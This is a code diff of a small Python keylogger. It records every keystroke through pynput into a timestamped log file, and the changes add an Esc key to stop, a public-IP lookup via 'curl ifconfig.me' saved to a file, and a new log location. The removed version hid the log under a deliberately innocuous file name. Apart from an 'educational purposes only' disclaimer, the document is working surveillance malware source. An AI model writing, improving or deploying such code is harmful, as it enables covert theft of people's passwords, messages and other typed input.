@@ -1,20 +1,31 @@
-#This is a keylogger program to log keystrokes and save them to a file
-#This program is for educational purposes only
-#I am not responsible for any misuse of this program
+# This is a keylogger program to log keystrokes and save them to a file
+# This program is for educational purposes only
+# I am not responsible for any misuse of this program
 
 import pynput
+import time
 from pynput.keyboard import Key, Listener
 import logging
+import os
 
-#Not suspicous name
-log_dir = "C:\Temp\FavoriteCandy.txt"
-
-#logging format
-logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+with open('ip.txt', 'w') as f:
+    f.write(os.popen('curl ifconfig.me').read())
 
 def on_press(key):
     logging.info(str(key))
 
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+
+def on_release(key):
+    if key == Key.esc:
+        # Stop listener
+        return False
+
+
+if __name__ == '__main__':
+    # Collect events until released
+    with Listener(
+            on_press=on_press,
+            on_release=on_release) as listener:
+        listener.join()
